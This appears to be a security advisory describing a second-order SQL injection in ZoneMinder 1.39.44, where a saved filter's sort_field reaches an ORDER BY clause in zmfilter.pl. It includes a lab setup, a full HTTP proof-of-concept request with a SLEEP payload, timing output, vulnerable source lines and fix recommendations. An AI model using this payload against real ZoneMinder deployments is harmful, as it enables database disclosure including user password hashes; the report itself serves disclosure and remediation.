### Vulnerability Details

**Official website / product:** https://zoneminder.com / https://github.com/ZoneMinder/zoneminder

**Repository:** ZoneMinder/zoneminder (stars at selection: 5977)

**Vulnerability type:** SQLi (second-order / incomplete denylist residual)

**Affected version:** 1.39.44 (verified on `zoneminder/zoneminder:dev`; audited source master `4eda31b` / `version.txt` 1.39.44). Same logic also present on branches that have not tightened the Perl `sort_field` whitelist in lockstep.

**Vulnerable URL / parameter:** `POST /zm/index.php` (`view=filter&action=Save&object=filter`) parameter `filter[Query][sort_field]`; sink is `zmfilter.pl` concatenating the stored value into `ORDER BY`.

**Complex vulnerability:** yes

### Verification Steps

Lab topology (original tree `labs/zoneminder-r61-a1/`; may have been removed after verify — rebuild with the compose below):

- Compose project: `zoneminder-r61-a1`
- Services / images: `db`=`mariadb:11.8`, `zoneminder`=`zoneminder/zoneminder:dev`
- Host ports: **24101→80** (Web `/zm/`), **24151→8555** (tcp/udp), **24161→9000**
- Audited commit: `4eda31b07d953f8affb3453bbf865468a3da9bc4` / `version.txt` 1.39.44
- Admin (set at first-run): `admin` / `AdminPass1!`

Reproducible compose skeleton (based on official `ZoneMinder/zmdockerfiles` + this lab’s ports; passwords are arbitrary but must match across services):

```yaml
name: zoneminder-r61-a1

services:
  db:
    image: mariadb:11.8
    restart: unless-stopped
    command:
      - --transaction-isolation=READ-COMMITTED
      - --skip-log-bin
    environment:
      TZ: UTC
      MARIADB_DATABASE: zm
      MARIADB_USER: zmuser
      MARIADB_PASSWORD: zmpass
      MARIADB_ROOT_PASSWORD: rootpass
    volumes:
      - db:/var/lib/mysql
    healthcheck:
      test: ["CMD", "healthcheck.sh", "--connect", "--innodb_initialized"]
      interval: 10s
      timeout: 5s
      start_period: 30s
      retries: 5

  zoneminder:
    image: zoneminder/zoneminder:dev
    restart: unless-stopped
    depends_on:
      db:
        condition: service_healthy
    environment:
      TZ: UTC
      ZM_DB_HOST: db
      ZM_DB_NAME: zm
      ZM_DB_USER: zmuser
      ZM_DB_PASS: zmpass
    ports:
      - "24101:80"
      - "24151:8555/tcp"
      - "24151:8555/udp"
      - "24161:9000"
    volumes:
      - events:/var/cache/zoneminder
      - logs:/var/log/zm
      - config:/config
      - type: tmpfs
        target: /dev/shm
        tmpfs:
          size: 1073741824
    tmpfs:
      - /run:exec,mode=0755
      - /tmp

volumes:
  db:
  events:
  logs:
  config:
```

Expected `docker compose ps` topology (observed):

```text
NAME                             IMAGE                       STATUS                   PORTS
zoneminder-r61-a1-db-1           mariadb:11.8                Up (healthy)            3306/tcp
zoneminder-r61-a1-zoneminder-1   zoneminder/zoneminder:dev   Up (healthy)            0.0.0.0:24101->80/tcp, 0.0.0.0:24151->8555/tcp, 0.0.0.0:24151->8555/udp, 0.0.0.0:24161->9000/tcp
```

1. Run `docker compose up -d` in the lab directory and wait until both services are Healthy. Open `http://127.0.0.1:24101/zm/` and complete first-run setup with admin **`admin` / `AdminPass1!`**.
2. Insert a **Dummy Monitor Id=1** and **Event Id=1** so `ORDER BY` expressions actually evaluate (otherwise SLEEP may not show a visible delay). Via Web UI: Monitors → Add (any savable Dummy/local source), confirm Id=1; then create or insert one Event (Events list shows Id=1). Or check with `docker exec -i zoneminder-r61-a1-db-1 mariadb -uzmuser -pzmpass zm` and `SELECT Id,Name FROM Monitors; SELECT Id,MonitorId FROM Events;`.
3. Log in at `http://127.0.0.1:24101/zm/`, open the Filters view, and capture session cookies (`ZMSESSID`, etc.) plus the page `__csrf_magic` token. Cookie/CSRF values in the PoC below are from the original lab session — replace them with a fresh session on reproduce. Stale CSRF yields a response like:

```html
<html><head><title>CSRF check failed</title>...</head>
<body>
<p>CSRF check failed. Your form session may have expired, or you may not have
cookies enabled.</p>
...
</body></html>
```

4. `POST /zm/index.php` to save a filter with `filter[Query][sort_field]=Id,(SELECT SLEEP(3))`, and set `filter[AutoArchive]=1` plus `filter[Background]=1` (or another Auto* flag so `zmfilter.pl --filter_id` loads the row; AutoExecute/System not required).
5. Confirm `Filters.Query_json` stores the malicious `sort_field` unchanged (`validStr` is only `strip_tags`). Example inside the DB container:

```bash
docker exec zoneminder-r61-a1-db-1 mariadb -N -uzmuser -pzmpass zm \
  -e "SELECT Query_json FROM Filters WHERE Name='r61a1-poc-final';"
```

6. Trigger the second-order path (or wait for Background):

```bash
docker exec zoneminder-r61-a1-zoneminder-1 bash -lc 'time zmfilter.pl --filter_id=5'
```

Perl `ZoneMinder::Filter::Sql()` hits the incomplete-denylist catch-all and builds `ORDER BY E.Id,(SELECT SLEEP(3))`; runtime ~3s+.

### Complete vulnerability PoC

Complete HTTP request (Docker lab):

```http
POST /zm/index.php HTTP/1.1
Host: 127.0.0.1:24101
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 861
Origin: http://127.0.0.1:24101
Referer: http://127.0.0.1:24101/zm/?view=filter
Cookie: ZMSESSID=b4070b784553169f48b77160c786bb80; zmSkin=classic; zmCSS=base; zmNavbar_type=normal
Connection: close

__csrf_magic=key%3A19663a81d52c50ae1ed01c84d9b65d665cf4e074%2C1793633668&view=filter&action=Save&object=filter&Id=&filter%5BName%5D=r61a1-poc-final&filter%5BUserId%5D=1&filter%5BAutoArchive%5D=1&filter%5BAutoUnarchive%5D=0&filter%5BAutoVideo%5D=0&filter%5BAutoUpload%5D=0&filter%5BAutoEmail%5D=0&filter%5BAutoMessage%5D=0&filter%5BAutoExecute%5D=0&filter%5BAutoExecuteCmd%5D=&filter%5BAutoDelete%5D=0&filter%5BAutoMove%5D=0&filter%5BAutoCopy%5D=0&filter%5BUpdateDiskSpace%5D=0&filter%5BBackground%5D=1&filter%5BConcurrent%5D=0&filter%5BLockRows%5D=0&filter%5BQuery%5D%5Bterms%5D%5B0%5D%5Battr%5D=Id&filter%5BQuery%5D%5Bterms%5D%5B0%5D%5Bop%5D=%3E&filter%5BQuery%5D%5Bterms%5D%5B0%5D%5Bval%5D=0&filter%5BQuery%5D%5Bsort_field%5D=Id%2C%28SELECT+SLEEP%283%29%29&filter%5BQuery%5D%5Bsort_asc%5D=1&filter%5BQuery%5D%5Blimit%5D=10&filter%5BQuery%5D%5Bskip_locked%5D=0
```

Complete HTTP response (raw Docker lab response):

```http
HTTP/1.1 302 Found
Date: Mon, 02 Nov 2026 15:34:28 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ?view=filter&Id=5
Content-Length: 0
Keep-Alive: timeout=5, max=97
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


```

Verification result:

- HTTP Save returned `302 Location: ?view=filter&Id=5`.
- Stored `Query_json`:

```json
{"terms":[{"attr":"Id","op":">","val":"0"}],"sort_field":"Id,(SELECT SLEEP(3))","sort_asc":"1","limit":"10","skip_locked":"0"}
```

- Perl `Sql()` produced:

```sql
SELECT E.*, unix_timestamp(E.StartDateTime) AS Time FROM Events AS E WHERE (  E.Id > 0
 ) AND ( E.Archived = 0 ) ORDER BY E.Id,(SELECT SLEEP(3)) ASC LIMIT 0,10
```

- In-container second-order trigger:

```text
=== Timing: zmfilter.pl --filter_id=5 ===
elapsed_sec=3.151

=== zmfilter_5.log ===
11/02/26 15:34:28.947353 zmfilter_5[866].INF [main:149] [Scanning for events using filter id '5']
11/02/26 15:34:29.405115 zmfilter_5[882].INF [main:149] [Scanning for events using filter id '5']
11/02/26 15:34:32.410400 zmfilter_5[882].INF [main:332] [Archiving event 1]
```

### Analysis

After GHSA-4wvq, PHP *read* paths validate via `Filter::isValidSortExpression()` so malformed `sort_field` is dropped in `Filter::sort_field()` / `Filter::Events()`. The save path still only applies `validStr()` (`strip_tags`), so malicious values remain writable into `Filters.Query_json`.

The Perl daemon `zmfilter.pl` reads `sort_field` from `Query_json` in `ZoneMinder::Filter::Sql()`. After an explicit column whitelist, a catch-all still does `$sort_column = 'E.'.$filter_expr->{sort_field}` and appends it to `ORDER BY` — an incomplete denylist. This is out of sync with the term-attr stripping added for GHSA-p8h3.

Any Events editor can store a Background filter with AutoArchive (etc.) and trigger time-based/expression injection when zmfilter scans, enabling database disclosure (including `Users` password hashes).

### Trigger / sink source (full path + line numbers):

```php
# File: web/includes/actions/filter.php
# Lines: 53-55
$_REQUEST['filter']['Query']['sort_field'] = validStr($_REQUEST['filter']['Query']['sort_field']);
$_REQUEST['filter']['Query']['sort_asc'] = validStr($_REQUEST['filter']['Query']['sort_asc']);
$_REQUEST['filter']['Query']['limit'] = validInt($_REQUEST['filter']['Query']['limit']);
```

```perl
# File: scripts/ZoneMinder/lib/ZoneMinder/Filter.pm
# Lines: 587-593
      } elsif ( $filter_expr->{sort_field} ne '' ) {
        $sort_column = 'E.'.$filter_expr->{sort_field};
      }
    }
    if ( $sort_column ne '' ) {
      $sql .= ' ORDER BY '.$sort_column.' '.($filter_expr->{sort_asc} ? 'ASC' : 'DESC');
    }
```

### Fix recommendations

1. On save, enforce the same strict whitelist as PHP `isValidSortExpression` / `buildSortSql`; reject illegal `sort_field` before persistence.
2. Remove the Perl catch-all; unknown `sort_field` must be ignored or fall back to a default column, kept in lockstep with PHP.
3. (Defense in depth) Migrate/clean historically stored malformed `Query_json.sort_field` values.
